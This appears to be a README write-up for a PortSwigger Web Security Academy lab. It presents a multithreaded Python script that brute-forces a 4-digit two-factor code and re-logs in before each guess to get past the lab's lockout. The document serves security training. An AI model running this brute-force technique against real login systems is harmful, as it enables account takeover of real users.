## Web security academy
### Lab Title: 2FA bypass using a brute-force attack
### Lab: 09

Burp suite community edition takes a lot of time to brute-force a 4-digits verification code. Then this is my simple program to get a 4-digits verification code, and it takes less time to get the verification code, depends on a 4-digits code [0001 or 9999].

## My Points:

### 1. Introduction: 
[Portswigger's web security academy](https://portswigger.net/) is a platform that provides practice labs for finding web application vulnerabilities. In the Authentication section the Lab-09 where the lab's 2-FA is vulnerable to a brute-force attack. This lab assumes that we already got username and password, and for the 2-FA verification code we brute-forced the code and then access the user's account.

### 2. **Technique is Brute-Force each range with Multiple Threads:**
  - **Range:** I started with 1 range ( means 0000 - 0999 ) for brute-forcing, the program start and brute-forces all possible keys between this range only (0000 to 0999), and if the code does not find in this range, then the next range starts (1000 to 1999).
    
  - **Threading:** let you run different tasks of your program simultaneously but it is time-based, and for details check the references. 

The code is in python3. It is a simple program only focuses on brute-forcing with multiple threads despite errors. [Burp Suite](https://portswigger.net/burp) is used to check the requests and responses because it's good to check what's going on in request/response. To run the code on Windows or Linux, **Python version 3** should be installed with proper libraries such as. **request, threading, BeautifulSoup**. Burp suite must be started to run the code.
     
  > Windows: 
  ```
  python lab-9.py
  ```

  > Linux:
  ```
  python3 lab-9.py
  ```

### 3. **Code:** 
Assume that some of the data is already known, like username and password.
  - **Define main variables:**

    ```
    # Burp Suite proxy
    proxy_urls = {
      'http': 'http://127.0.0.1:8080',
      'https': 'http://127.0.0.1:8080',
    }

    thread_list = []
    solved_flag = False # flag to check code found, and no further request send
    ```
         
  - **User inputs:** When the program executes, it takes 3 inputs from the user.

    ```        
    if __name__ == "__main__":
        # User input: Lab URL, username, and password
        k_url = input("Enter Lab URL: ").strip().rstrip("/")
        username = input("Enter Account Username: ").strip()
        password = input("Enter Account Password: ").strip()

        if (not (k_url and username and password)):
            print()
            print("[-] Error! Input variable(s) missing.")
            print("[-] Lab URL: https://a...........c2.web-security-academy.net")
            print("[-] Username")
            print("[-] Password")
            sys.exit()
        else:
            main()
    ```      
      - Enter Lab URL: Get lab URL from your browser address bar and paste it.
      - Victim's credentials already mentioned on the Lab page, copy/paste username and password.
    

  - **Main Function:** After giving the required inputs the main() function is called.

    ```        
    def main():
      global solved_flag
    
      print()
      print("[*] Processing...")

      start_t = time()

      # initial request
      sn_init = requests.Session()
      csrf = send_login_req(sn_init)

      # start 1 range at a time, and check the solved flag
      for i in range(10):
          for j in range(10):
              t = threading.Thread(target=brute_force_code, name="p-%d-%d" %(i,j), args=(i, j))
              t.start()
              thread_list.append(t)

          for tj in thread_list:
              tj.join()       

          # break the loop no need to start next threads
          if solved_flag:
              break         
          
          thread_list.clear()
          
      end_t = time()
      print("[-] Execution Time: %.5f seconds" % (end_t - start_t))          
    ```
        
    The main() function starts the nested for loop. The outer (i) loop is for the first digit, and the inner loop (j) is for the second digit of the 4-digits  verification code and it starts the multiple threads with each iteration and passes the i and j values to the brute_force_code() function, the inner loop starts 10 threads and then outer loop wait till the started threads completed, if verification code found then the loop breaks no further execution is needed OR the loop continues and start the next iteration of outer (i) loop.
    
  - **brute_force_code():** Each thread calls a function **brute_force_code(i, j)** with 2 parameters.
    ```
    def brute_force_code(i, j):
        global solved_flag        
        sn = requests.Session()
        
        for code in product('0123456789', repeat=2):
            if solved_flag:
                break
            c = str(i) + str(j) + code[0] + code[1]
            csrf = send_login_req(sn)
            
            res = sn.post(k_url + '/login2', {'csrf': csrf, 'mfa-code': c}, proxies=proxy_urls, verify=False)

            if "account-content" in res.text:
                print("[-] Solved! verification Code: ", c)
                solved_flag = True
                break
    ```
        
    This function send the requests, and the main points of this function are:
      1. The request object is created.
      2. For loop is used with product method to get last 2-digits of the 2-FA code, in each iteration before sending the verification code the program calls **send_login_req()** function first and sends 3 requests to the login page and logged-in the user again because, after every 2 incorrect verification codes, the lab needs to login again then enter the verification code, so to avoid this redirection i sent login request before each code verification request.
      4. The **get_csrf()** function is used to extract **CSRF** from responses. 
      5. If the response is true then **solved_flag** is updated and breaks the loop, and this **solved_flag** value is also checked in the main() function to break the main() loop, and no further requests are needed. 
       
    <br>
### 4. **Results:**
  Table shows the result of the lab, but time also depends on the code range.

  2-FA Code | Time (min.)
  ---------| -------------
  0734 | 2 min.
  1933 | 7 min.

### 5. **Loop Ranges:**
  ```
    > i-0
    >   j-0
    >     0000
    >     0001
    >     0002
    >     ....
    >     ....
    >     0044
    >     0041
    >     ....
    >   j-1
    >     0100
    >     0101
    >     0102
    >     ....
    >     ....
    >     ....
    >     0177
    >     0178
    >     ...
    >     ...
    >     0199
    >   j-2
    >     0200
    >     0201
    >     0202
    >     ....
    >     ....
    >     ....
    >   j-3
    >   j-4
    >   j-5
    >   j-6
    >   j-7
    >   j-8
    >   j-9
    >     0900
    >     0901
    >     0902
    >     ...
    >     ...
    >     0955
    >     0956
    >     ...
    >     ...
    >     0999
    
    and if not found in the 0000 to 0999 range then the next range starts:
    
    > i-1
    >   j-0
    >     1000
    >     1001
    >     1002
    >     ....
    >     ....
    >     ....
    >   j-1
    >     1100
    >     1101
    >     1102
    >     ....
    >     ....
    >     ....
    >   j-2
    >     1200
    >     1201
    >     1202
    >     ....
    >     ....
    >     ....
    >   j-3
    >   j-4
    >   j-5
    >   j-6
    >   j-7
    >   j-8
    >   j-9
    >     1900
    >     1901
    >     1902
    >     ...
    >     ...
    >     ...
    >     1999
    > i-2
    > ...
    > ...
    > ...
    
  ```

## References:
   - [https://portswigger.net/web-security/dashboard](https://portswigger.net/web-security/dashboard)
   - [https://docs.python.org/3/library/itertools.html](https://docs.python.org/3/library/itertools.html)
   - [https://realpython.com/intro-to-python-threading/](https://realpython.com/intro-to-python-threading/)
  
